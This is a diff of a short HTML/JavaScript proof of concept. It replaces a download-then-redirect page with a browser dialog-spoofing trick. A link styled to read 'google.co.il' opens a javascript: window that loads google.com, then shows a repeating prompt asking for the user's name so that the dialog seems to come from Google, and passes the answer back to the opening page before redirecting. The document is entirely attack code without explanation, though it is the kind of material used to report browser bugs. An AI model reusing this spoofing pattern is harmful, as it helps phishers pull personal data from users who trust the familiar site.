@@ -1,35 +1,41 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Download + Meta Refresh</title>
-</head>
-
-<body>
-
-<button onclick="start()">Download Chrome</button>
+<a href="javascript:run();" style="font-size:100px;">google.co.il</a>
 
 <script>
-function start() {
+var myWindow;
 
-    // create download link
-    var a = document.createElement("a");
-    a.href = "https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg";
-    a.download = "";
-    document.body.appendChild(a);
+function run(){
 
-    // trigger download
-    a.click();
+    var script = `
+        setTimeout(function(){
+            var t = window.open('https://google.com');
+        },250);
 
-    // meta refresh after short delay
-    setTimeout(function() {
-        var meta = document.createElement("meta");
-        meta.httpEquiv = "refresh";
-        meta.content = "0; url=https://example.com";
-        document.head.appendChild(meta);
-    }, 120);
+        setTimeout(function(){
 
+            var name = '';
+            while(name == ''){
+                name = prompt('Give me your name please','');
+            }
+
+            window.opener.save(name);
+            window.close();
+
+        },5000);
+
+        setTimeout(function(){
+            var meta = document.createElement('meta');
+            meta.httpEquiv = 'refresh';
+            meta.content = '0; url=https://example.com';
+            document.head.appendChild(meta);
+        },5500);
+    `;
+
+    myWindow = window.open("javascript:" + script);
+}
+
+function save(name){
+    alert("Name is " + name);
+    myWindow.close();
+    window.close();
 }
 </script>
-
-</body>
-</html>
